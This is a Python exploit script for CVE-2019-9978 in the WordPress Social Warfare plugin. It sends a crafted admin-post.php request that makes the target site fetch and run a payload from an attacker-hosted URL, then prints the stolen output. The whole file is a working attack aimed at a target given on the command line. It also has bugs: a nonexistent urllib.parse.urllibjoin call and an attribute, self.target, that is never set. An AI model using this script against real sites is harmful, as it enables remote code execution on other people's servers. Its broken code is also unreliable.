import argparse
import requests
import re
import sys
import urllib.parse
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2019-9978
# Wordpress - The social-warfare plugin <= 3.5.3
class CVE2019_9978:
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
    def __init__(self, url, payload_url):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.vuln_url = 'wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s'
        self.payload_url = payload_url
        self.session = requests.Session()
    
    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        url = urllib.parse.urllibjoin(self.target, self.vuln_url % self.payload_url)
        r = self.session.get(url)
        if r.status_code == 500:
            print (LogColors.YELLOW + "received respose from server" + LogColors.ENDC)
            obj = re.search(r"^(.*)<\!DOCTYPE", r.text.replace( "\n", "lnbreak" ))
            if obj:
                resp = obj.groups()[0]
                if resp:
                    print (LogColors.YELLOW + "received: " + LogColors.ENDC)
                    print (LogColors.YELLOW + resp.replace("lnbreak", "\n") + LogColors.ENDC)
                    print (LogColors.GREEN + "hacked :)" + LogColors.ENDC)
                else:
                    print (LogColors.RED + "nothing received..." + LogColors.ENDC) 
                    print (LogColors.RED + "the server is not vulnerable :(" + LogColors.ENDC)
                    sys.exit()
            else:
                print (LogColors.RED + "nothing received..." + LogColors.ENDC) 
                print (LogColors.RED + "the server is not vulnerable :(" + LogColors.ENDC)
                sys.exit()
        else:
            print (LogColors.RED + "unexpected response status code" + LogColors.ENDC)
            sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--url', required = True, help = "target url")
    parser.add_argument('-p','--payload', required = True, help = "payload url")
    args = vars(parser.parse_args())
    cve = CVE2019_9978(args['url'], args['payload'])
    cve.exploit()

